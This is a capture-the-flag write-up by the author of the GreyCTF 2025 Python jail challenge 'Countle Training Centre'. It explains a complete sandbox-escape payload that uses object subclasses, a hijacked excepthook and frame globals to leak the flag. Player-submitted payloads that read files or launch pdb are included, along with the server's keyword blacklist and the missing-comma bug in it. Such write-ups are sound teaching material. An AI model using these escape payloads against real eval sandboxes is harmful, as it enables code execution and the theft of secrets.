# [MISC] Countle Training Centre

## Description
The Countle World Championships is coming! Time to step up your game and start training! It's just a measly 1,000,000 puzzles a day, anyone can do it.

[Distrib@greyctf25](https://github.com/NUSGreyhats/greyctf25-challs-public/tree/main/misc/countle_training_centre/distrib)

### Flag

`grey{4_w0r1D_c1As5_c0Un7L3_p1aY3r_1n_0uR_mId5t}`

## (Intended*) Solution Explantation

The intended solution is unfortunately not optimal, but I will do my best to explain it. Perhaps it might be useful for other pyjails in future.

### Solution

```python
(s:=().__class__.__base__.__subclasses__()[120]().load_module('sys'),s.__setattr__('excepthook',lambda *a:s.stdout.write(a[2].tb_frame.f_globals.__str__())),a)
```

### Part 0

```python
if (not match(r"[0-9+\-*/()]+", expr)):
    # incorrect format
elif (len(expr) > 160):
    # incorrect format
```

Firstly, we want to get past the regex, which is waaaaay to simple. We can simply wrap our solution with `()`. This also allows use to use the walrus operator to assign variables and reuse them where necessary.

### Part 1

Assuming the blacklist is treated at face value (foreshadow lol), we need to bypass that. There are many ways to do so in python.

Pre-python3.12, my go-to class to use is `<class 'warnings.catch_warnings'>`, but in python3.12 this was removed from the list of builtin classes (when running a script). Instead, we can use other classes like `<class '_frozen_importlib.BuiltinImporter'>`, `<class 'collections.abc.Sized'>` and more.

```python
s:=().__class__.__base__.__subclasses__()[120]().load_module('sys')
```

For this solution, we used `<class '_frozen_importlib.BuiltinImporter'>` to load/import the `sys` module, which is assigned to the variable `s`.

### Part 2

```python
s.__setattr__('excepthook',lambda *a:s.stdout.write(a[2].tb_frame.f_globals.__str__()))
```

Using the `__setattr__` function, we change the excepthook to a custom one. The excepthook is used to catch any uncaught exception. Usually, it will print out the exception information then exit the program. In this case, we want to use it to access the trace stack, which is the second param of the hook function.

```python
a[2].tb_frame.f_globals.__str__()
```

Ordinarily, we would be within (or above) the `eval` trace stack, which would not contain the flag since `eval` is runned with `{'FLAG':"no flag for you", "__builtins__": None}`. However, the `excepthook` is called outside of the `eval` and therefore has the flag variable.

We can get the current frame `.tb_frame` then obtain the global variables using `.f_globals`.

Lastly, since `print` is banned by the blacklist, we can substitute with `s.stdout.write`.

### Part 3

```python
a
```

Actually you still need to trigger an uncaught error, which is pretty simple. Here, a `NameError` is triggered since variable `a` is not defined.

```
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader 
object at 0x104ee0470>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 
'/Users/ngkayhian/Documents/ctf-writeups/Grey Cat The Flag 2025/Countle Training Centre/distrib/server.py', '__cached__': 
None, 'match': <function match at 0x104f0ab60>, 'exit': <built-in function exit>, 'sleep': <built-in function sleep>, 
'generateSolvablePuzzle': <function generateSolvablePuzzle at 0x104f9dda0>, 'format': <function format at 0x104f09620>, 
'banner': <function banner at 0x104f9d1c0>, 'goal': <function goal at 0x104fccd60>, 'menu': <function menu at 0x104fcce00>, 
'help': <function help at 0x104fccea0>, 'BLACKLIST': ['breakpoint', 'builtinscat', 'compile', 'dict', 'eval', 'exec', 
'getframe', 'help', 'import', 'input', 'inspect', 'open', 'os', 'sh', 'signalsubprocess', 'system'], 'blacklist': <function 
blacklist at 0x104fccf40>, 'checkAnswer': <function checkAnswer at 0x104fccfe0>, 'challenge': <function challenge at 
0x104fcd080>, 'FLAG': 'grey{4_w0r1D_c1As5_c0Un7L3_p1aY3r_1n_0uR_mId5t}', 'choice': 'S'}
```

### Oopsie

At this point, an astute reader might notice two weird items in the `BLACKLIST` - namely `'builtinscat'` and `'signalsubprocess'`.

Yes, I made a newbie coding error. And I only noticed it after reading a [writeup](https://0necloud.github.io/CTF-Writeups/Grey%20Cat%20The%20Flag%202025/Countle%20Training%20Centre/#:~:text=Source%20Code%20Analysis) where the player found this "vulnerability".

```python
BLACKLIST = ['breakpoint', 
             'builtins' 'cat',        # missing comma
             'compile', 'dict', 'eval', 'exec', 'getframe',
             'help', 'import', 'input', 'inspect', 'open', 'os', 'sh', 
             'signal' 'subprocess',   # missing comma
             'system']
```

When defining the `BLACKLIST`, I was adding new blacklist words up until a few days before the qualifiers. On my very last addition, I added `'builtins'` and `'signal'`, but forgot to put the commas in. And evidently I didn't test the service.

What does this mean for the challenge? Since the `eval` is running with `"__builtins__": None`, it is still not as trivial as just accessing the python builtins, but it definitely opened up some avenues.

## Alternative Solutions (without explanation)

```python
0+(a:=().__class__.__base__.__subclasses__()[151].__len__.__globals__["__builtins__"],a["print"](a["op""en"]("/app/run").read()))

# by Leo (https://discord.com/channels/969232688521281606/1378292097685262377/1378715661890621501)
```

```python
().__class__.__base__.__subclasses__()[158]().__call__.__buil𝘵ins__[_:="__impor\x74__"]("pdb").set_trace()

# by hawke (https://discord.com/channels/969232688521281606/1378292097685262377/1378715771873529898)
```

## Thoughts

This was my first pyjail, and it is definitely quite crude. Half way through the quals, I realised that I accidentally left a debug code in the service and distribution. Thankfully due to my poor coding practice of using `_` as variable names, the debug code was rendered useless (otherwise it would reveal the flag upon solving 3 countle puzzles, LOL!).

Moving forward, I will definitely try to learn from my mistakes and explore more of python intricacies. Looking forward to writing another interesting pyjail.